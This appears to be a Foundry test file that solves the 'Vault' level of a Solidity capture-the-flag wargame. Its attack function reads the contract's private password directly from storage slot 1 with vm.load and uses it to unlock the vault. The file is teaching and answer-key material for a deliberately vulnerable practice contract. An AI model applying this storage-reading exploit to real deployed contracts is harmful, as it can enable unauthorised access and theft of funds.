// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Tests} from "@core/Tests.sol";
import {VaultFactory, Vault} from "../levels/08_Vault/VaultFactory.sol";

contract TestVault is Tests {
    Vault private level;

    /* =============================== SETUP&ATTACK =============================== */

    constructor() {
        levelFactory = new VaultFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance());
        level = Vault(levelAddress);
    }

    function attack() internal override {
        vm.startPrank(PLAYER);

        bytes32 pass = vm.load(levelAddress, bytes32(uint256(1)));
        level.unlock(pass);
        assertTrue(!level.locked());

        vm.stopPrank();
    }

    /* =============================== TEST LEVEL =============================== */

    function testLevel() external {
        runLevel();
    }
}
